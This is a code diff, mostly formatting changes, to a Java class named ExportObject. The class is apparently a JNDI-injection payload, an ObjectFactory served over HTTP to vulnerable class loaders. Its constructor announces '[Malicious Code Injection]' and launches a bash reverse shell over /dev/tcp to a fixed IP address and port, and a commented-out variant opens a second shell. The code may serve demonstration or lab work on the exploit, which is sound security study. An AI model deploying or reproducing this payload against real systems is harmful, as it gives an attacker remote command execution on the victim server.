@@ -1,13 +1,12 @@
 package com.rajasoun.jndi;
 
-import javax.naming.Context;
-import javax.naming.Name;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.Hashtable;
 
-import java.io.*;
+import javax.naming.Context;
+import javax.naming.Name;
 
 /**
  * ExportObject class is served via HTTP for URLClassloaders
@@ -17,14 +16,14 @@ import java.io.*;
  */
 public class ExportObject implements javax.naming.spi.ObjectFactory {
     // Reset
-    public static final String RESET = "\033[0m";  // Text Reset
+    public static final String RESET = "\033[0m"; // Text Reset
 
     // Underline
-    public static final String RED_UNDERLINED = "\033[4;31m";    // RED
+    public static final String RED_UNDERLINED = "\033[4;31m"; // RED
 
     // Regular Colors
-    public static final String RED = "\033[0;31m";     // RED
-    public static final String GREEN = "\033[0;32m";   // GREEN
+    public static final String RED = "\033[0;31m"; // RED
+    public static final String GREEN = "\033[0;32m"; // GREEN
 
     public ExportObject() throws IOException {
         System.out.println(ExportObject.RED_UNDERLINED + "[Malicious Code Injection]" + ExportObject.RESET);
@@ -38,13 +37,14 @@ public class ExportObject implements javax.naming.spi.ObjectFactory {
         launchReverseShell();
     }
 
-    public static void launchReverseShell(){
+    public static void launchReverseShell() {
         try {
-            String[] payload = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.1.72/4444 0>&1"};
-            //String[] payload_b = {"/bin/bash", "-c", "exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+            String[] payload = { "/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.1.72/4444 0>&1" };
+            // String[] payload_b = {"/bin/bash", "-c", "exec 5<>/dev/tcp/127.0.0.1/4444;cat
+            // <&5 | while read line; do $line 2>&5 >&5; done"};
             Process p = Runtime.getRuntime().exec(payload);
             BufferedReader in = new BufferedReader(
-                new InputStreamReader(p.getInputStream()));
+                    new InputStreamReader(p.getInputStream()));
             String line;
             while ((line = in.readLine()) != null) {
                 System.out.println(line);
@@ -68,7 +68,7 @@ public class ExportObject implements javax.naming.spi.ObjectFactory {
         return null;
     }
 
-    public static void main (String[] args ) throws IOException {
+    public static void main(String[] args) throws IOException {
         System.out.println("Export Object");
         new ExportObject();
     }
